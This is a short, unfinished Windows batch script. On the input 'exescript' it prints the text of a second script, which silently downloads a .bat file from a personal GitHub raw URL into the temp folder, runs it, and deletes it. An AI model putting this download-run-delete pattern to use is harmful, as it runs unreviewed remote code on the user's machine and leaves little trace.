::head
:MAIN
Title WIP
echo you must wait..
set /p Text=
if %Text%== exescript goto EXEscript
::End Head


::executable script
:exescript
cls
echo executable script:
echo]
echo @echo off
echo setlocal
echo]
echo]
echo set "tempDir=%TEMP%"
echo]
echo]
echo curl -s https://raw.githubusercontent.com/MEna12321234/MENA1234321executablesfiles/refs/heads/main/script.bat -o "%tempDir%\script.bat"
echo]
echo]
echo call "%tempDir%\script.bat"
echo]
echo]
echo del "%tempDir%\script.bat"
echo]
echo endlocal
echo pause

pause >nul
goto MAIN
::End executable script


::END